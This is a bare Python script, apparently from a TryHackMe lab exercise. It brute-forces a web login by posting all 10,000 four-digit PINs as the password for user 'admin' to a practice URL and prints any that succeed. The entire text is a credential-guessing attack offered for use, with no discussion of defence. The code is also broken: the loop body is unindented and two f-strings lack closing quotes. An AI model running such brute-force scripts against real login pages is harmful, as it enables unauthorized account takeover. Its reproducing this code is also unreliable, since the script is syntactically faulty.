import requests

url = "http://python.thm/labs/lab1/index.php"

username = "admin"

password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
    data = {"username":username, "password":password}
    response = requests.post(url,data=data)
    
    if "invalid" not in response.text:
        print(f"[+] Found valid creds, {username}:{password})
    else:
        print(f"Attempting: {password})
        

brute_force()
    
